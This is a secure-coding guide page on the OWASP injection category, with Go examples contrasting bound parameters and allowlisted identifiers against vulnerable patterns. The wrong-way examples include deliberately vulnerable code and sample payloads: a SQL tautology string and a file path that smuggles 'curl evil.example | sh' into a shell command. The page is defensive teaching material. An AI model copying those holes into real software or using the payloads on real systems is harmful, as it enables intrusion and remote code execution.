# A05:2025 — Injection

*OWASP Top 10:2025 · External: OWASP*

## What it is

Data placed where an interpreter reads it, and the interpreter cannot distinguish your
structure from the attacker's content. SQL and NoSQL, OS commands, LDAP, XML and XXE,
templates, expression languages, file paths, log entries, headers. **Down from #3 in 2021 to
#5.**

## Why it fell without being solved

Because parameterised APIs became the default in mainstream frameworks, so the *common* case
is handled by the tooling rather than by the author. What remains is the residue: raw-query
escape hatches, dynamic identifiers that cannot be parameterised, ORM `where` clauses built
from strings, and the newer classes — template injection, unsafe deserialisation, log
injection — that the parameterisation habit does not cover.

The rank fall is about defaults improving, not about the class becoming less dangerous when
it does occur.

## When to check for it

Grep for concatenation and interpolation into any query, command, markup, path or header.
Then, for each hit:

- Is the defence **structural**, and can you name the mechanism? "It's escaped" is a finding
  until you can name the function and confirm it matches the destination context.
- Is the value attacker-reachable — **including via a database row written earlier**? Stored
  injection is the case that survives review.
- Is any identifier dynamic? Those cannot be parameterised and need an allowlist.
- Does any template come from anywhere but the repository?

## How to use it

The standard is `../injection-defense.md`. The two shapes that matter most here.

```go
// RIGHT — bound parameters. Structure fixed before data arrives.
rows, err := db.QueryContext(ctx,
    `SELECT id, effect FROM decisions WHERE repository = $1`, repo.String())
```

```go
// RIGHT — an identifier cannot be a parameter, so the user picks a KEY and the
// code chooses the SQL.
var sortColumns = map[string]string{"date": "created_at", "severity": "severity"}
column, ok := sortColumns[requested]
if !ok { return ErrBadSortKey }
```

**The invariant: no user-controlled string reaches an interpreter's code channel.** Values are
bound; identifiers are allowlisted to literals.

## How not to use it

**Concatenation.**

```go
// WRONG
query := "SELECT id FROM decisions WHERE repository = '" + repo + "'"
// Symptom: repo = "x' OR '1'='1" returns everything. Quoting is not a defence.
```

**A command string through a shell.**

```go
// WRONG
exec.Command("sh", "-c", "opa eval -d "+path+" '"+q+"'")
// Symptom: path = "x; curl evil.example | sh" executes.
```

**Stored injection — the case review misses.**

```go
// WRONG — "it comes from the database, so it is trusted".
renderHTML(w, row.Reason)
// Symptom: the row was written by an earlier unvalidated request. "It comes from
// the database" only defers the question to whoever wrote it.
```

**A concatenated log line.**

```go
// WRONG
log.Printf("decision for %s: %s", repo, reason)
// Symptom: a newline in `reason` forges a log entry. Structured fields only.
```

**Trade-off:** allowlisting identifiers and avoiding shells is more code than interpolation,
and some legitimate shapes — dynamic `IN` clauses, bulk inserts — stay awkward. There is no
version where concatenation becomes acceptable.

**Related:** `../injection-defense.md`, `../input-validation.md`,
`a01-broken-access-control.md`
